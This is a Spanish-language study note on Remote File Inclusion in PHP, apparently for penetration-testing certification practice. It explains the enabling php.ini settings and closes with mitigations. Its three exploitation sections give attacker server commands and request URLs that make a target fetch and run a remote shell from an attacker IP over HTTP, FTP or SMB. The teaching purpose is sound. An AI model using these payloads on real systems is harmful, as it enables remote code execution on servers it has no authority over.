# Remote File Inclusion (RFI)

![CPTS Path](https://img.shields.io/badge/CPTS-Web%20Exploitation-00ff66?style=flat-square&logo=gitbook&logoColor=white)

La Inclusión de Archivos Remotos (RFI) es una vulnerabilidad que permite a un atacante incluir y ejecutar un archivo alojado de forma remota (generalmente en un servidor bajo su control) dentro del contexto de la aplicación web vulnerable.

---

## [+] Mecánica de la Vulnerabilidad
RFI ocurre cuando una función de inclusión en el servidor backend (como `include()` o `require()` en PHP) acepta una URL o una dirección externa directa como parámetro de entrada sin sanitización ni validación.

### Requisitos en PHP (`php.ini`)
Para que RFI sea explotable en un servidor PHP, deben estar activadas las siguientes directivas:
*   `allow_url_fopen = On` - Permite abrir URLs como archivos.
*   `allow_url_include = On` - Permite incluir/ejecutar URLs como archivos locales.

---

## [>] Vectores de Explotación

### 1. HTTP/HTTPS Inclusion
El atacante aloja una webshell o script malicioso en su propio servidor web.
```bash
# Servidor del atacante (10.10.14.5)
python3 -m http.server 80
```
Petición maliciosa al objetivo:
`http://target.com/index.php?page=http://10.10.14.5/shell.txt&cmd=whoami`

> [!NOTE]
> Muchas veces es preferible usar la extensión `.txt` en el servidor del atacante para evitar que el servidor local del atacante interprete y ejecute el código PHP antes de enviarlo. El servidor víctima descargará el código fuente en texto plano y lo interpretará localmente.

### 2. FTP Inclusion
Si los filtros del servidor web bloquean las cabeceras `http://` o `https://`, se puede intentar la inclusión utilizando el protocolo FTP:
```bash
# Servidor FTP del atacante
python3 -m pyftpdlib -p 21
```
Petición:
`http://target.com/index.php?page=ftp://10.10.14.5/shell.php`

### 3. SMB Inclusion (Solo Windows)
Si el servidor víctima corre en Windows, se puede abusar de rutas UNC utilizando el protocolo SMB. En este escenario, `allow_url_include` no necesita estar habilitado en `php.ini`, lo que hace este bypass muy útil.
```bash
# Compartir recurso SMB en el atacante
impacket-smbserver share /path/to/web/shells -smb2support
```
Petición:
`http://target.com/index.php?page=\\10.10.14.5\share\shell.php`

---

## [*] Medidas de Mitigación
1.  **Desactivar la inclusión remota:** Asegurarse de que `allow_url_include = Off` en la configuración de PHP.
2.  **Lista blanca (Whitelisting):** Si es necesario incluir archivos dinámicamente, utilizar una lista predefinida de archivos permitidos.
3.  **Sanitización estricta:** Validar que los parámetros no contengan esquemas de URL (como `http://`, `https://`, `ftp://`).
